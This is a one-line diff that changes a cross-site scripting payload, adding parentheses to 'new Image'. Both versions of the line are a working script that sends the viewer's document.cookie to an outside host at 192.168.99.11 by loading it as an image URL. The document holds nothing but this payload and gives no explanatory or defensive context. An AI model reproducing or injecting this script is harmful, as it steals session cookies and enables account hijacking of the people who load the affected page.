@@ -1,1 +1,1 @@
- <script>var i=new Image;i.src="http://192.168.99.11/jar.txt"+document.cookie;</script>
+ <script>var i=new Image();i.src="http://192.168.99.11/jar.txt"+document.cookie;</script>
